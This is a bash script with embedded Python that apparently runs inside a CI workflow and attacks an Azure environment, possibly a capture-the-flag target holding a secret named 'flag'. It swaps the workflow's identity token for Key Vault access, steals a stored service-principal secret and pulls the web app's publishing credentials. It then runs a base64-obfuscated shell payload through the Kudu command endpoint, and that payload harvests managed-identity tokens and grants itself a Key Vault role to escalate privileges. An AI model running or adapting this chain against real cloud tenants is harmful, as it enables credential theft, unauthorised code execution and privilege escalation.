#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64,json,os,time,urllib.parse,urllib.request,urllib.error
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
RID="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="app-tbl-reporting-prod.scm.azurewebsites.net"
def P(x): print("OUT="+json.dumps(x,default=str)[:4000],flush=True)
def rd(req,t=30): return json.loads(urllib.request.urlopen(req,timeout=t).read().decode())
def form(u,f): return rd(urllib.request.Request(u,data=urllib.parse.urlencode(f).encode(),method="POST"))
def ac(url,tok,m="GET",b=None,t=30,raw=False):
  try:
    r=urllib.request.urlopen(urllib.request.Request(url,data=(json.dumps(b).encode() if b is not None else None),method=m,headers={"Authorization":tok,"Content-Type":"application/json"}),timeout=t)
    return r.status,r.read().decode("utf-8","replace")
  except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")[:500]
  except Exception as e: return 0,repr(e)
try:
  oidc=rd(urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api%3A%2F%2FAzureADTokenExchange",headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]
  vt=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc})["access_token"]
  sp=json.loads(rd(urllib.request.Request(KV1+"/secrets/reporting-service-principal?api-version=7.4",headers={"Authorization":"Bearer "+vt}))["value"])
  arm=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":sp.get("appId"),"grant_type":"client_credentials","client_secret":sp.get("clientSecret"),"scope":"https://management.azure.com/.default"})["access_token"]
  ps,pb=ac("https://management.azure.com"+RID+"/config/publishingcredentials/list?api-version=2023-01-01","Bearer "+arm,"POST",{})
  pub=json.loads(pb)["properties"]; auth="Basic "+base64.b64encode((pub["publishingUserName"]+":"+pub["publishingPassword"]).encode()).decode()
  P({"pubcreds":ps})
  w='''set +e
IE="$IDENTITY_ENDPOINT"; IH="$IDENTITY_HEADER"
echo "WK_ENV ie=${IE} hdr=$([ -n "$IH" ] && echo yes)"
gt(){ curl -s "$IE?resource=$1&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IH" | sed -E 's/.*"access_token":"([^"]+)".*/\\1/'; }
VT=$(gt "https://vault.azure.net"); echo "WK_VTLEN=${#VT}"
F=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" -H "Authorization: Bearer $VT"); echo "WK_DIRECT: $F"
if ! echo "$F" | grep -q '"value"'; then
 AT=$(gt "https://management.azure.com")
 PL=$(echo "$VT"|cut -d. -f2); PL="$PL$(printf '=%.0s' $(seq $(((4-${#PL}%4)%4))))"
 OID=$(echo "$PL"|tr '_-' '/+'|base64 -d 2>/dev/null|grep -oE '"oid":"[^"]+"'|head -1|cut -d'"' -f4); echo "WK_OID=$OID"
 G=$(cat /proc/sys/kernel/random/uuid)
 R=$(curl -s -X PUT "https://management.azure.com/subscriptions/__SUB__/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments/$G?api-version=2022-04-01" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d "{\\"properties\\":{\\"roleDefinitionId\\":\\"/subscriptions/__SUB__/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6\\",\\"principalId\\":\\"$OID\\",\\"principalType\\":\\"ServicePrincipal\\"}}")
 echo "WK_GRANT: $(echo "$R"|head -c 250)"
 for i in 1 2 3 4 5 6; do sleep 5; VT=$(gt "https://vault.azure.net"); F=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" -H "Authorization: Bearer $VT"); echo "WK_TRY$i: $F"; echo "$F"|grep -q '"value"' && break; done
fi'''
  w=w.replace("__SUB__",SUB)
  b64=base64.b64encode(w.encode()).decode()
  cmd="bash -c \"echo "+b64+" | base64 -d | bash\""
  # warm SCM
  for i in range(12):
    s,_=ac("https://"+SCM+"/api/settings",auth,"GET",None,20); 
    if s==200: P({"warm":i,"status":s}); break
    time.sleep(8)
  # run command, retry 502
  for i in range(4):
    s,r=ac("https://"+SCM+"/api/command",auth,"POST",{"command":cmd,"dir":"site/wwwroot"},180)
    P({"kudu_attempt":i,"status":s})
    if s==200: print("KUDU="+r[:20000],flush=True); break
    time.sleep(10)
except Exception as e: P({"outer":repr(e)})
PY
PY
